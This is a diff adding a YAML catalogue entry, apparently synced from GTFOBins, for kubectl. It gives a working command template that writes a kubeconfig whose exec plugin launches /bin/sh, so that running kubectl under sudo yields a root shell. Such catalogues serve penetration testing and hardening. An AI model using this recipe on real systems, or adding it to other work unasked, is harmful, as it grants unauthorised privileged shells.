@@ -1,0 +1,29 @@
+id: gtfobins/kubectl/shell/sudo
+type: binary
+platform: linux
+name: kubectl
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\n\
+    contexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name:\
+    \ x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode:\
+    \ Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\
+    \nkubectl get pods --kubeconfig=/path/to/temp-file"
+  comment: The shell is spawn multiple times.
+references:
+- https://gtfobins.github.io/gtfobins/kubectl/
+tags:
+- linux
+- unix
+- gtfobins
